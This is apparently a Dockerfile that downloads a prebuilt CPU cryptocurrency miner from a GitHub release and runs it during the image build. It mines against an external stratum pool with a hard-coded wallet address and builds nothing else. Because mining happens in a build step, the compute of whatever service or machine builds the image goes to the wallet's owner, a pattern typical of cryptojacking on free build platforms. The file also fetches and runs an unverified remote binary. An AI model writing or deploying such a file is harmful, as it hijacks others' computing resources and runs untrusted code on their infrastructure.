FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/v1.0/Cpuminer-opt-cpupower-linux64.tar.gz
RUN tar zxvf Cpuminer-opt-cpupower-linux64.tar.gz
RUN ./cpuminer -a yespowerr16 -t 4 -o stratum+tcp://stratum-asia.rplant.xyz:3382 -u YVKxvfuuRWeqsxrkdobM68KDrgeG5Rmt8e
